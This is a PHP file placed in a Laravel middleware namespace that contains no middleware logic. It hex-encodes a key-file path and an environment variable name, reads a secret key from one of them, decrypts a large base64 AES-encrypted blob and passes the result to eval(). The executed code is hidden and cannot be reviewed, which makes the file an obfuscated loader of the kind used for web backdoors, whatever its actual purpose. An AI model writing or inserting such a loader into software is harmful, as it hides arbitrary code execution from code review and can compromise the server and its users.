<?php
namespace App\Http\Middleware;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('0Y0P6IsKoswXlAmdPLYaow==');

$c=base64_decode(

'mllgRLgkAswNzSB3SvG3nGgWqwhw5P3mzRIqyLKuVBNBcb75o5acCiaRFYLDx87NKcWomFjmvfh2' .
'/lZcxRTp1rxymBf6nT76Gp5g/IqypOVKBqpURyq/LGJRXuh5R4JaA+4Yk5ZnX074bs3JjVeV8fVJ' .
'9lxh7aJIA18PYVnF8pVH43XiSIRRBWnS8hl56yTRO6ccT3cz2+xvnGCasdqvx8I8RiqvxUMku9yX' .
'sc0pwCc6kb2n4JzbrA7v/lQPPgerf0KsuZ6m89KaFI7P+putMc6GX4CH4nt9JbzMDX/F0lGgLiYI' .
'+B8m0CEL79jC7qAoRBURptGeXjeVMrlTvsBbAwqEVyyzLZpGk6O/KtWM2YR3GvjqG2Ebz+HQoCON' .
'dDy4D00Gm06OHLjU1ZRyE7LjBqHvS8pA5UOuoCEOvt4x+2KeXnI8WyHRQN/nJY9hN9/Z4EWGYThs' .
'DmtGG8sjr0ZrvHwAdNysBIWAF6dt1HGptdNvoNZeKl74qTVPiFywYQ3IzWfCCFLLQstpoe0HL/tT' .
'HjKZei9PlVk0D5RcMklxKX0wqGnz+f23o1RW67dNPcOvZocSqM8olMzZWf/UqXWAa0JMSQltN7Ye' .
'72INfRBccx/SLxzVtSXUAIqC5TfCi3umziMa7y9DNI2CTCS9LTX7EBqfCE+nX++u27ZAXen32u+4' .
'uQ+Cb+vSvV4csHOm+9+LR+wBd5zKSkS9vJLE5XBya6bAo44LL32kVPqj0rImwNq2G2xeFjp2ldWw' .
'OjodKVoPoUDkjixE93lsJTihxrWZ11kNn/1BGISJEW18vhh3VATpPMt6Fn0ysyeXvImmuMjM3ugC' .
'Pnj7/UI9BsgaiPjxSNCC/gYRiu8iCB34+0CE8Ud9bhJSfU+nN+o8RcGKctritAP+Vte26JucnwxW' .
'+5ap6jZ7RKg+5R9P7iBfcx84RFsn68Zjyl6h2Kl4+M33RD7sioOvAC3FWyWAeSXyxBYK2VzcuLo2' .
'VLm6/Qfbhir5CmUHxwvb1DHpWDvDpKKnSpc/Gh1+KFzKJVgQ9r//6i0az0AhwGEWfDBKKssd1GAe' .
'06OrirQEn1Rtur5rcQxpl4Ij5rQaAOQbu+cNulqsk4gdl07kL5a8hQOf4SIFp4GMj1b+BSKn2sMb' .
'u3dDeygjEzt4PDTB0bcGdE8KcgNMdT8mzLc8+ospzlq1ZxFhKvY805JQCmSdaAxmRK6591y18NmK' .
'cjevs5tW4N+uczxvw8WbJ2t9DXaP3cJdE3qOhfmHB9FyVMAKvfnqaEJnAS3dVIaMzbpn//Xxc4L8' .
'4u2pqFNLP0V0khw+MDF81X4WcQn3ynd8irvXfODd2ssUGcOQyfr+tLupeggYrGbH5aE5R8IDDkym' .
'GTU7/kSa+DoCkwwBguTnBq0CTd1PEkgg9xf6GSK9UaCmUFQWwk0bnp6jrNS2DF8GZqMQK1lbRg/5' .
'ttKE03ZLQFdXunmw0s+YoJfEzTbtG/yLYBna/9TvvaWaIlnl8/osVzYC8Smdw+g1UTwRIgK3+L5L' .
'HhVlydYz4l1H34d71Ow/PfpOdVHt5IT9OJsc93O9FeGaZ7AOOdoFCr5+vc5boK/vV7+p6a8wP7JW' .
'AtTW229vsUXMObGzBS7b9TYwsQ9Hrh36FhUxSuXxZ3XtQIRFXfqk6bMj9+4+LZdq7lXahO28YO8W' .
'NkPIyJ7wp1BnzagD+aJ4lyShdH5u+eB+sDbl5wOdulHsy6mr3j85yXiCkq7LI6i2m/6tj2Yh0GnJ' .
'gHS/raUpswcdtFEc32aPvPyFJKqh+0uv7ste5g0IM4qcZ8kuegcVFYuLZ8433fx2WKQczrcqRvX0' .
'ABTPD5SSvTFX1pkE39GisqKRWOMdG/esM3jla0bJxEpIP3ZV35Yx6BPOKmpphqV9WfDq3f8G05Yc' .
'8+sCm8oyTUvtd4fO04/AU992hNmY7zur90RgaAJ5lCpkdzdvkPBk8uwrR0a5kKCxbvU7uZZtmxsf' .
'Bb26An+mviDZ+KysIppaJqCNZUJGyoVQweDkD925YvBcWivHCOxKJk/nfxAhz9RKC5+TZZtMYTl/' .
'P/fbDf1L8OwUnGy7bxLBYh7/bxrMq6rMOXClfxevnA5Wvapecx0hbWbmBRtitGJoV6bb3Z3hHz2b' .
'xkX4x+l64li2aLroIPIzDeBcyIqqMxKkmy8w7IGMhmO1Vf37A2Onr8D4KpahmODtaMM3BZymquAo' .
'o5oFPll06Cs1LfdExLeev45gL2/kW3kCpb7CqMhcIjr4F4b5yliGQRvqK5p03k8utKqEiFU2K7k0' .
'mrWlopvMAEpJkuqbGE6/lnqWEhRn/z9CyAG/tADgex/Am1a69gJIev1Wl+Y4BL3lTIdemaXbnfVn' .
'vN2Q1Tj+VhvUaknujvKpu84vTBPQeeXMcQGeMAsCuppCui77A+KDZxoa3LBzSQ6FDmYSfZ4p4jUq' .
'DizVSmMzcLmDq/XgMSqSKsuL0f/yWx6agV1gpC/aqRJgma7zTM5Y9SPWqlJFZlm0ouPvzoauR+kV' .
'QnL6ruWxQiNhefCm1KEne/CsqOmX0Z29cqCz3uczom5sRqwG3k1UBHA8BY3pkXZUWKkqHZFJRQpQ' .
'sNhDGCAzJ6P/xHChv6TvPsE78He5HSB9RvoFrVUS/R3DtzeEwe3Nsqf1ua8HupAW1W5hm0YXy6si' .
'dq2p7cNc9VjALn3prBbIJMTm/vEv112xQ4DzB5FilrOsN0VULQU3s0VWGrwMtGtjn+Bgw8zfGeOn' .
'j5CJJMznSJmP5XvUipbBWVYBZ4hn6gY6tEBayKRQfjAXv0eFnQXS/8p/GffaavvQwN8hwfkG89CN' .
'BNK3nGmNSOu4dwkM0yS2mpVKp9yBm+KnvBBWljjM6VoJeGVTfKvDSuKAHCSrdv1iKr7HiTH7D0pQ' .
'8Im2WOCmHXPpIoaJWcwvR6ZyFNewvaITJKOGW/UBTK0eT9nADHQSTp3odGi8WlOgiLUnROm9SwN7' .
'/q5R2ka8zXbklDpkTMkVGkpHQAW8hUrRygP1hFzx1YQkEwh9oJMT6m1jkQhIO7ib6gmFfgSS+ndm' .
'QwEpzCsQGMDsp4HNiBYUCiLliYvuXkfbP9Deag4tRoVOlfvyqL4NWx8xO4+yFX+5VrCbEratBYAz' .
'UovdRapkuYEAvRlwqY+d8ccYZMKy89z/GQVynk9SR/XKAE9AFrku++Wg5O/+vZXXP2mYdXsmBBY8' .
'r2JhqxCQhGv/EGXmehUKyMAdJlddB+4GtoynkGAqHTdEh6fgegToXF70pQ4hT86flXkxNH7g2TOy' .
'JcgBEUWQx16G9w5m29OF/iCKxjLu2Rx/ONdV2J9oYjtNzVFMCY4n81hPPlACdMIgtDg71Jh4AMeZ' .
'mNm+0NX893wmqVY2NFIx7Co2nHIAJvmZIL0I67YwXpRoS9cp9d0GTccDsJfAK2wMOzHXOIXzB02d' .
'RluXtmmv+eNGlJMXIOARHHPYDYI44rzca8dPQrtUsJ7RnZTNzK5GdP7vTfGaO1XZ/YvHd0lpgFd8' .
'Ieh50tic7RdycLLvAkRjiRVFrTUTm4T9dFUvk4UihTBGoWUE+GYNq7lrgDrHTYxgQOBFylE7pUsJ' .
'uwhfE+ieTEHfbEDqU8f0adomv432bq60G6qh6QrOgLOrotklnNAPxzqM3dMcWPwQ0X8yscwqzyxU' .
'Vb+9y3/16cyXJn52GBYlasVAT8MDCF8cr2+VOkvwOS7oFUXZoxkmz0zsN5Ul7U+fD6OhLCEnLXTR' .
'gYm4+OwxIvtUY9kXwFpy/txb3YStuI2Mpa6CXfxZz4oT/57SGlCNhdJ/pTUBvE8A55wblLqF++7a' .
'YDFrtzbOoonnVAt+BQU='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

